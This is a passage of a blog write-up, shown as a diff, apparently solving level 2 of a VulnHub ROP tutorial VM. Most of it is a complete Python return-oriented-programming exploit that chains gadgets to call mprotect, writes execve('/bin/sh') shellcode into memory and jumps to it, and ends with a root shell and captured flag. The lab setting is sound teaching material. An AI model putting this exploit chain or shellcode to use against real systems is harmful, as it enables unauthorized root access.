+payload += struct.pack('I', 0x2000) # len
+payload += struct.pack('I', 1 | 2 | 4) # prot
+
+payload += struct.pack('I', memcpy) # call memcpy
+payload += struct.pack('I', target_memory) # return to target_memory
+
+payload += struct.pack('I', target_memory) # dst
+payload += struct.pack('I', 0xbffff724) # src
+
+shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80'
+
+payload += struct.pack('I', len(shellcode)) # len
+
+payload += shellcode
+
+print payload
+</code></pre><p>Looking at this, I'll need to tweak the len and prot parameters for the call to 'mprotect', the len parameter for the call to 'memcpy', and all references to the target_memory variable.</p>
+<p>All the gadgets in this level were found using the awesome online tool, <a href="http://ropshell.com/">ROPShell</a>.</p>
+<p>Let's deal with mprotect first.</p>
+<p>After doing some digging, I decided to setup the registers by hand, and jump mid-way into the mprotect function. This saves me from some (what looked like) nasty stack manipulation in order to get the stack ready for mprotect.</p>
+<p>I first deal with getting the value 0x2000 into ecx for the len parameter of mprotect.</p>
+<pre><code>payload += struct.pack('I', 0x080658d7) # pop ecx; adc al, 0x89; ret
+payload += struct.pack('I', 0xffffffff)
+payload += struct.pack('I', 0x08083c16) # inc ecx; adc al, 0x39; ret
+payload += struct.pack('I', 0x0805155d) # pop edi; ret
+payload += struct.pack('I', 0x080b0b9c) # 0x00002000
+payload += struct.pack('I', 0x0806893b) # add ecx, [edi]; mov dh, 1; pop ebp; ret
+payload += struct.pack('I', 0xdeadbeef) # junk for pop ebp
+</code></pre><p>What I decided to do, was to pop the value 0xffffffff onto ecx, increment ecx by one (to end up with 0x00000000), pop the address of the value 0x00002000 onto edi, and then add the value at the address edi to ecx, resulting in 0x00002000 in ecx. I had to add an extra word on to the stack for the add gadget.</p>
+<p>Next up is the dst parameter of mprotect.</p>
+<pre><code>payload += struct.pack('I', 0x0805249e) # pop ebx; ret
+payload += struct.pack('I', (target_memory+1))
+payload += struct.pack('I', 0x0804f871) # dec ebx; ret
+</code></pre><p>As our target address ends in 0x00, I decided to simply increment it by one before pushing it on to the stack. This value is then popped onto ebx, and then ebx is decreased by 1, resulting in 0x8048000.</p>
+<p>Getting 0x7 into edx for the prot parameter of mprotect feels nasty, but it works.</p>
+<pre><code>payload += struct.pack('I', 0x08052476) # pop edx; ret
+payload += struct.pack('I', 0xffffffff)
+payload += struct.pack('IIIIIIII', 0x0804eda1, 0x0804eda1, 0x0804eda1,
+        0x0804eda1, 0x0804eda1, 0x0804eda1, 0x0804eda1, 0x0804eda1) # inc edx; add al, 0x83; ret
+</code></pre><p>I first of all pop 0xffffffff onto edx, and then increment edx by one seven times. I can ignore the 'add al' call, as we're not using EAX at the moment.</p>
+<p>After we're done, I call mprotect, including a word for the cleanup mprotect performs.</p>
+<p>Note, we're providing the address of mprotect+13, so as to avoid the setup mprotect performs in popping values off of the stack. We've done this setup already!</p>
+<pre><code>payload += struct.pack('I', 0x0805229d) # mprotect+13
+payload += struct.pack('I', 0xdeafbeef) # junk for mprotect cleanup
+</code></pre><p>Next up is the setup for memcpy. First of all I set eax to valid memory address. This is important - you'll see why in a sec.</p>
+<pre><code>payload += struct.pack('I', 0x08052476) # pop edx; ret
+payload += struct.pack('I', target_memory+len(shellcode))
+payload += struct.pack('I', 0x0806fb4c) # mov eax, edx; ret
+</code></pre><p>Next, I create a helper method that allows me to write a word to an arbitrary memory position.</p>
+<pre><code>def cpymem(dst, val, dstcorrect=0):
+    popebx = 0x0805249e # pop ebx; ret
+    popedx = 0x08052476 # pop edx; ret
+    decebx = 0x0804f871 # dec ebx; ret
+    movebxedx = 0x08052393 # mov [ebx], edx; add [eax], al; ret
+
+    if dstcorrect&gt;0:
+        dst += dstcorrect
+    payload = struct.pack('I', popebx)
+    payload += struct.pack('I', dst)
+
+    for i in range(0, dstcorrect):
+        payload += struct.pack('I', decebx)
+
+    payload += struct.pack('I', popedx)
+    payload += struct.pack('I', val)
+
+    payload += struct.pack('I', movebxedx)
+
+    return payload
+</code></pre><p>This method essentially takes in a few arguments - the destination for the word, the word itself, and a number to correct the destination by. First of all, if any destination correction value is provided, we add that to the destination. We then pop the destination onto ebx. We then loop over from 0 to the value of the destination correction, using a 'dec ebx' gadget to decrease the value of ebx the correct number of times. We then pop or value onto edx, and call a gadget which moves the value in the edx register into the address pointed to by the ebx register.</p>
+<p>Note the second instruction in the 'mov [ebx]' gadget. It adds the value of the al register to the address pointed to by eax. That is why we needed to set a valid memory address in the eax register earlier!</p>
+<p>With our helper function created, I split up the shell code, tinker with it slightly to get it into the correct order, and write it to memory</p>
+<pre><code># split our shell code every four characters
+shellcode_split = [shellcode[i:i+4] for i in range(0, len(shellcode), 4)]
+
+# loop over our shell code
+for idx, word in enumerate(shellcode_split):
+    # encode and convert it
+    encoded_word = word.encode('hex')
+    reversed_word = ''.join(reversed([encoded_word[i:i+2] for i in range(0, len(encoded_word), 2)]))
+    int_word = int(reversed_word, 16)
+
+    # and write to memory
+    if idx==0:
+        payload += cpymem(target_memory, int_word, 1)
+    else:
+        payload += cpymem(target_memory + (4 * idx), int_word)
+</code></pre><p>Almost there!</p>
+<p>We now set ebx to 0x8048000 using the same trick as before.</p>
+<pre><code>payload += struct.pack('I', 0x0805249e) # pop ebx; ret
+payload += struct.pack('I', (target_memory+1))
+payload += struct.pack('I', 0x0804f871) # dec ebx; ret
+</code></pre><p>And finally, we call ebx!</p>
+<pre><code>payload += struct.pack('I', 0x0806a853) # call ebx
+</code></pre><p>Putting it all together..</p>
+<pre><code>import struct
+
+def cpymem(dst, val, dstcorrect=0):
+    popebx = 0x0805249e # dst
+    popedx = 0x08052476 # val
+    decebx = 0x0804f871 # dec ebx; ret
+    movebxedx = 0x08052393 # mov [ebx], edx; add [eax], al; ret
+
+    if dstcorrect&gt;0:
+        dst += dstcorrect
+    payload = struct.pack('I', popebx)
+    payload += struct.pack('I', dst)
+
+    for i in range(0, dstcorrect):
+        payload += struct.pack('I', decebx)
+
+    payload += struct.pack('I', popedx)
+    payload += struct.pack('I', val)
+
+    payload += struct.pack('I', movebxedx)
+
+    return payload
+
+eip_position = 44
+mprotect = 0x08052290
+target_memory = 0x08048000
+
+shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80'
+
+payload = 'A' * eip_position
+
+# setup for mprotect
+
+# get 0x2000 into ecx
+payload += struct.pack('I', 0x080658d7) # pop ecx; adc al, 0x89; ret
+payload += struct.pack('I', 0xffffffff)
+payload += struct.pack('I', 0x08083c16) # inc ecx; adc al, 0x39; ret
+payload += struct.pack('I', 0x0805155d) # pop edi; ret
+payload += struct.pack('I', 0x080b0b9c) # 0x00002000
+payload += struct.pack('I', 0x0806893b) # add ecx, [edi]; mov dh, 1; pop ebp; ret
+payload += struct.pack('I', 0xdeadbeef) # junk for pop ebp
+
+# get 0x08048000 into ebx
+payload += struct.pack('I', 0x0805249e) # pop ebx; ret
+payload += struct.pack('I', (target_memory+1))
+payload += struct.pack('I', 0x0804f871) # dec ebx; ret
+
+# get 0x7 into edx
+payload += struct.pack('I', 0x08052476) # pop edx; ret
+payload += struct.pack('I', 0xffffffff)
+payload += struct.pack('IIIIIIII', 0x0804eda1, 0x0804eda1, 0x0804eda1,
+        0x0804eda1, 0x0804eda1, 0x0804eda1, 0x0804eda1, 0x0804eda1) # inc edx; add al, 0x83; ret
+
+# call mprotect
+payload += struct.pack('I', 0x0805229d) # mprotect+13
+payload += struct.pack('I', 0xdeafbeef) # junk for mprotect cleanup
+
+# pop target_memory + len(shellcode) into edx, the mov into eax
+#  this is to ensure our movebxedx gadget in the cpymem function
+#  has a valid address to add to
+payload += struct.pack('I', 0x08052476) # pop edx; ret
+payload += struct.pack('I', target_memory+len(shellcode))
+payload += struct.pack('I', 0x0806fb4c) # mov eax, edx; ret
+
+# split our shell code every four characters
+shellcode_split = [shellcode[i:i+4] for i in range(0, len(shellcode), 4)]
+
+# loop over our shell code
+for idx, word in enumerate(shellcode_split):
+    # encode and convert it
+    encoded_word = word.encode('hex')
+    reversed_word = ''.join(reversed([encoded_word[i:i+2] for i in range(0, len(encoded_word), 2)]))
+    int_word = int(reversed_word, 16)
+
+    # and write to memory
+    if idx==0:
+        payload += cpymem(target_memory, int_word, 1)
+    else:
+        payload += cpymem(target_memory + (4 * idx), int_word)
+
+# set ebx to 0x08048000
+payload += struct.pack('I', 0x0805249e) # pop ebx; ret
+payload += struct.pack('I', (target_memory+1))
+payload += struct.pack('I', 0x0804f871) # dec ebx; ret
+
+# and call
+payload += struct.pack('I', 0x0806a853) # call ebx
+
+print payload
+</code></pre><p>And the result!</p>
+<pre><code>level2@rop:~$ ./level2 $(python level2.py)
+[+] ROP tutorial level2
+[+] Bet you can't ROP me this time around, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����&lt;
+
+           ;ﾭޞqv�������������ﾯ�vL�qv1�Ph��v//sh�vh/bi��$
+                                                       vn��1��vɉ�j��v$
+                                                                     X̀��qS!
+# id
+uid=1002(level2) gid=1002(level2) euid=0(root) groups=0(root),1002(level2)
+# cat flag
+flag{to_rop_or_not_to_rop}
+#
+</code></pre><h3 id="conclusion">Conclusion</h3>
+<p>Thank you <a href="https://twitter.com/@barrebas">Bas</a>, for the <strong>AMAZING</strong> VM. I don't think I would of managed to get my head around ROP any other way. Really, really enjoyable.</p>
+<p>As always, thank you <a href="https://www.vulnhub.com">VulnHub</a> for hosting these images!</p>
+</p>
+    </article>
+  </div>
+</div>
+
+<div class="row">
+  <div class="col-xs-12">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        /* * * CONFIGURATION VARIABLES * * */
+        var disqus_shortname = 'g0blin';
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+  </div>
+</div>
+    </div>
+    <script>
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+      ga('create', 'UA-54854230-1', 'auto');
+      ga('send', 'pageview');
+
+    </script>
+    <script>
+      var pres = document.querySelectorAll("pre code");
+      for (var i=0; i<pres.length; i++) {
+        var pre = pres[i];
+        var html = pre.innerHTML;
+        var language = 'language-js';
+        if (html.indexOf('|*|-') ===0) {
+          var code = html.split('-|*|')[1].substring(1);
+          language = html.split('|*|-')[1].split('-|*|')[0];
+          pre.innerHTML = code;
+        }
+        pre.classList.add(language);
+      }
+      var as = document.querySelectorAll("a");
+      var comp = new RegExp('^http(s)://');
+
+      for (var i=0; i<as.length; i++) {
+        var a = as[i];
+        if (comp.test(a.getAttribute('href'))) {
+          a.setAttribute('target', '_blank');
+        }
+      }
+    </script>
+    <script src="/js/prism.js"></script>
+  </body>
+</html>
